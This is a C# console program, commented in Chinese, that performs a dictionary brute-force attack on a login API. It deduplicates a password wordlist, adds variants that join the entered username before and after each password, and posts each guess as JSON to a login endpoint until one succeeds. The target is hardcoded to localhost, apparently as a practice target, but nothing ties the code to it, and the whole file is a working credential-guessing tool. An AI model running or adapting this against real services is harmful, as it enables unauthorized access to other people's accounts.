// See https://aka.ms/new-console-template for more information

using System.Text;
using System.Text.Json;

class Program
{
    static async Task Main(string[] args)
    {
        Console.WriteLine("Hello, World!");
        Console.Write("请输入账号: ");
        string username = Console.ReadLine();

        string passwordTxt = "password.txt"; // 降重前的字典文件
        string passwordCheck_Txt = "password3.txt"; //  降重后的字典文件
        // 查看老密码
        if (!File.Exists(passwordTxt))
        {
            Console.WriteLine("密码文件不存在，请检查文件路径是否正确。");
            return;
        }

        // 给老密码降重
        check_repeat_pass(passwordTxt, passwordCheck_Txt);
        Console.WriteLine("去除重复密码成功");

        // 生成新密码
        Console.WriteLine("开始生成字典");
        string newPassTxt = create_password(username, passwordCheck_Txt); // 返回新密码文件名字
        Console.WriteLine("生成成功，开始破译.");

        string url = "http://localhost:5191/Api/user/LogIn";
        using (HttpClient client = new HttpClient())
        {
            foreach (string passwordLine in File.ReadLines(newPassTxt))
            {
                string password = passwordLine.Trim(); // 移除行首尾的空白字符  
                if (await AttemptLoginAsync(client, url, username, password))
                {
                    Console.WriteLine($"登录成功，密码为: {password}");
                    return;
                }
            }
        }

        Console.WriteLine("所有密码测试失败，未找到有效密码。");
    }

    // 发起请求
    // 构建请求方式，检测返回状态
    static async Task<bool> AttemptLoginAsync(HttpClient client, string uri, string username, string password)
    {
        // 构建请求头
        var content = new StringContent(JsonSerializer.Serialize(new { username, password }), Encoding.UTF8,
            "application/json");
        // 发起请求
        HttpResponseMessage response = await client.PostAsync(uri, content);
        // Console.WriteLine(response.Content.ToString());
        return response.IsSuccessStatusCode; // 检查是否返回200状态码  
    }

    // 生成字典函数
    // 参数：账号，密码，文件路径
    static string create_password(string username, string passwordTxtName)
    {
        string newFileName = "password2.txt";
        string[] passwords = File.ReadAllLines(passwordTxtName);
        using (StreamWriter file = new StreamWriter(newFileName, false)) // 创建或覆盖新文件  
        {
            // 写入原password.txt中的所有密码  
            foreach (var password in passwords)
                file.WriteLine(password);

            // 写入账号本身
            file.WriteLine(username);

            // 写入用户名+密码格式的新密码  
            foreach (var password in passwords)
            {
                string newPassword1 = username.Trim() + password.Trim();
                file.WriteLine(newPassword1);
            }

            // 写入密码+用户名格式的新密码  
            foreach (var password in passwords)
            {
                string newPassword2 = password.Trim() + username.Trim();
                file.WriteLine(newPassword2);
            }
        }

        return newFileName;
    }

    // 给原字典文件降重
    // 参数：老密码文件名，新密码文件名
    public static void check_repeat_pass(string fileName, string newFileName)
    {
        // 读取所有密码并存储到HashSet中，自动去除重复项  
        HashSet<string> newPass = new HashSet<string>(File.ReadAllLines(fileName));
        // 将去重后的密码写入新文件  
        File.WriteAllLines(newFileName, newPass);
    }
}